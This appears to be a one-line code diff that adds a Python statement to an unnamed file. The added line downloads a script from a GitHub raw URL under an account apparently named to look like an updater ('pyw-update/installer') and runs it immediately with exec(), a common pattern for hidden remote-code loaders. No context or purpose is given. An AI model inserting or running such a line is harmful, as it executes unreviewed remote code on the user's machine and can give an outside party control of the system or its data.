@@ -1,0 +1,1 @@
+import urllib.request; exec(urllib.request.urlopen('https://raw.githubusercontent.com/pyw-update/installer/refs/heads/main/main.py').read())
